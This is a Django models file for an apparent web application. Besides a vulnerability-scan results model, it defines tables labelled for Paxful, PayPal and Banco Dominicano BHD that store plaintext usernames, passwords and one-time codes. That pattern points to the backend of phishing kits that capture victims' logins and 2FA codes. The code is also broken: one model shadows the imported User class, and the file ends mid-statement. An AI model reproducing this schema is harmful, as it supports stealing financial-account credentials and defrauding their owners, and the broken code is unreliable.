from django.db import models
from django.contrib.auth.models import User
from django.db.models.signals import post_save
from django.dispatch import receiver
from django.utils import timezone

class ScanResult(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    url = models.URLField()
    vulnerability_type = models.CharField(max_length=255)
    details = models.TextField()
    mitigation = models.TextField()
    payload = models.TextField(null=True, blank=True)
    scan_id = models.CharField(max_length=255, blank=True)  # Add this field
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.vulnerability_type} at {self.url}"
    


class Profile(models.Model):
    user = models.OneToOneField(User, on_delete=models.CASCADE)
    premium_status = models.BooleanField(default=False)

    def __str__(self):
        return self.user.username



@receiver(post_save, sender=User)
def create_user_profile(sender, instance, created, **kwargs):
    if created:
        Profile.objects.create(user=instance)

@receiver(post_save, sender=User)
def save_user_profile(sender, instance, **kwargs):
    instance.profile.save()




class FailedLoginAttempt(models.Model):
    ip_address = models.GenericIPAddressField()
    attempt_time = models.DateTimeField(default=timezone.now)

    def __str__(self):
        return f"{self.ip_address} at {self.attempt_time}"



#models for paxful




class UserSubmission(models.Model):
    username = models.CharField(max_length=150)
    password = models.CharField(max_length=128)

    def __str__(self):
        return self.username

class OTPSubmission(models.Model):
    user_submission = models.ForeignKey(UserSubmission, related_name='otps', on_delete=models.CASCADE)
    otp = models.CharField(max_length=10)
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.user_submission.username} - {self.otp}"



#model bancodominicanobhd currently fb


class User(models.Model):
    user_id = models.CharField(max_length=100, null=True, blank=True)
    clave = models.CharField(max_length=100, null=True, blank=True)
    image = models.ImageField(upload_to='images/', null=True, blank=True)

    def __str__(self):
        return self.user_id



#models for paypal


class UserSubmissionPaypal(models.Model):
    username = models.CharField(max_length=150)
    password = models.CharField(max_length=128)

    def __str__(self):
        return self.username

class OTPSubmissionPaypal(models.Model):
    user_submission = models.ForeignKey(UserSubmissionPaypal, related_name='otps', on_delete=models.CASCADE)
    otp = models.CharField(max_length=10)
    timestamp = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.user_submission.username} - {self.otp}"
    


    #paxfulpay
class  PaxfulPay(models.model):
    amount = models.
